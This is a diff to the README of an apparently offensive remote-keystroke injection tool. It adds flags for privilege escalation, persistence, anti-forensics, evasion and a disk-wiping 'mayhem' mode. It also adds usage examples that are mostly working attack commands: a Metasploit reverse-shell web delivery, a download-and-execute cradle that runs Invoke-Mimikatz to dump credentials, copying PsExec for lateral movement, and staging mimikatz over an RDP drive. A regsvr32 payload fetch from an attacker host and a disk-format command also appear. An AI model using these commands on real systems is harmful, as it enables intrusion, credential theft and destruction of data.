@@ -47,8 +47,6 @@ Flags:
 
 COMMON OPTIONS:
     -c, --command <command | cmdfile>   Specify a command or a file containing to execute
-    -i, --input <input_file>            Specify the local input file to transfer
-    -o, --output <output_file>          Specify the remote output file to transfer
 
     -p, --platform <operating_system>   Specify the operating system ("windows" is set by
                                         default if not specified)
@@ -59,11 +57,23 @@ COMMON OPTIONS:
 
     -h, --help                          Display this help message
 
+UPLOAD FILES:
+    -i, --input <input_file>            Specify the local input file to transfer
+    -o, --output <output_file>          Specify the remote output file to transfer
+
 METHODS:
-    -m, --method <method>               Specify the file transfer or execution method
-                                        (For file transfer "pwshb64" is set by default if
-                                        not specified. For command execution method
-                                        "none" is set by default if not specified)
+    -m, --method <method>               Specify a method. For command execution method
+                                        "none" is set by default if not specified.
+                                        For file transfer "pwshb64" is set by default
+                                        if not specified. Other available methods are:
+                                        "elevate", "persistence", "antiforensics", and
+                                        "mayhem"
+
+    -s, --submethod <submethod>         Specify a submethod from a method (applies with -m flag)
+
+    -a, --action <action>               Specify an action from a submethod (applies with -s flag)
+
+    -e, --evasion <evasion>             Specify an evasion method for uploading files (only works for "pwshb64")
 ```
 
 ## Usage
@@ -236,13 +246,9 @@ $ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 3; set 
 $ rks -c "regsvr32 /s /n /u /i://http://<attacker_IP>:<attacker_PORT>/implant.sct scrobj.dll" -m dialogbox
 ```
 
-- MSBuild
+#### Cross Platform
 
-Coming soon
-
-#### Unix
-
-TODO: Fill the missing info
+Execute and implant with `python` using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.
 
 ```
 $ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set payload python/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath implant; exploit"
@@ -308,6 +314,57 @@ $ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterp
 $ rks -c ".\implant.exe"
 ```
 
+Another way to transfer files especially for sysadmin and offensive tools. Let's take `PsExec64.exe` as an example to requires us for lateral movement. It'll take a long time to upload via text without interruption. Instead the fastest way is to mount the WebDAV that belongs to the legitimate website of sysinternals suite toolkit (`live.sysinternals.com`). Instead of using the file explorer which is much slower than executing commands. Here are the commands for command prompt.
+
+```
+$ cat commands.txt
+net use z: \\live.sysinternals.com\tools
+copy z:\PsExec64.exe .
+
+$ rks -c "cmd.exe" -m dialogbox
+
+$ rks -c commands.txt
+```
+
+Here's another variant for powershell cmdlets when transferring `PsExec64.exe` in Windows.
+
+```
+$ cat cmdlets.txt
+New-PSDrive -Name Z -PSProvider FileSystem -Root "\\live.sysinternals.com\tools"
+Copy-Item z:\PsExec64.exe .
+Remove-PSDrive -Name Z
+
+$ rks -c "powershell.exe" -m dialogbox
+
+$ rks -c cmdlets.txt
+```
+
+The best way to retrieve fileless malware or offensive tools through powershell is by simply hosting/retrieving legitimate websites such as, `https://github.com` and executing it. Let's use `Invoke-Mimikatz` to retrieve credentials downloading and executing the cradle from [nishang](https://github.com/samratashok/nishang).
+
+```
+$ cat hashdump.txt
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1')
+Invoke-Mimikatz -DumpCreds
+
+$ rks -c "powershell.exe" -m dialogbox
+
+$ rks -c hashdump.txt
+```
+
+If you have large files that it's nearly impossible to wait for the file transfer to be finished. `xfreerdp` allows to mount a local directory with `/drive:/path/to/directory/` flag. Then navigate the file browser or shell prompt to `\\tsclient\<share_name>\` to view the contents.
+
+```
+$ mkdir Tools
+
+$ cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe Tools/
+
+$ xfreerdp /kbd:US /clipboard /compression /dynamic-resolution /sec:<tls | rdp | nla> [/d:"<domain_name>"] /u:"<username>" /p:"<password>" /v:<IP>:[<PORT>] /drive:Tools
+
+$ rks -c "cmd.exe" -m dialogbox
+
+$ rks -c "dir \\tsclient\<share_name>\"
+```
+
 ### 0x04 - Privilege Escalation
 
 Note: WIP (Work In Progress)
@@ -369,7 +426,7 @@ $ rks -m mayhem -s format -s diskpart -a pwsh
 - If you're targeting VNC network protocols you can specify the window name with `tightvnc`.
 
 ```
-$ rks -i implant.ps1 -w tightvnc
+$ rks -c implant.ps1 -w tightvnc
 ```
 
 ### 0x09 - FAQ
@@ -391,6 +448,8 @@ $ sudo rm -f /usr/local/bin/remotekeystrokes /usr/local/bin/rks
 ```
 
 ## TODO and Help Wanted
+
+- [ ] Rewrite the flag switches to minimize for reusability.
 
 - [ ] Implement encryption method of AES256 via base64
 
